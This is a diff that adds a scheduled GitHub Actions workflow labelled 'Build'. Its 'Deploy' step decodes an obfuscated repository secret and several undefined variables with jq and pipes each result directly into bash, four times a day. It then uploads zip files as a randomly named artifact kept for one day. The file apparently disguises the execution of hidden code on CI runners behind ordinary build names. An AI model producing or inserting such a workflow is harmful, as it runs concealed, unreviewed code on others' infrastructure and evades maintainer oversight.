@@ -1,0 +1,34 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          aly0110: ${{ secrets.aly0110 }}
+        run: |
+          printf '%s' "$aly0110" | jq -r .gqf76 | /bin/bash
+          printf '%s' "$n9832" | jq -r .u55649 | /bin/bash
+          echo $isw5 | jq -r .uyfce710 | /bin/bash
+          printf '%s' "$v591" | jq -r .mqvz1 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: BB4eI5Yn
+          path: "*.zip"
+          retention-days: 1
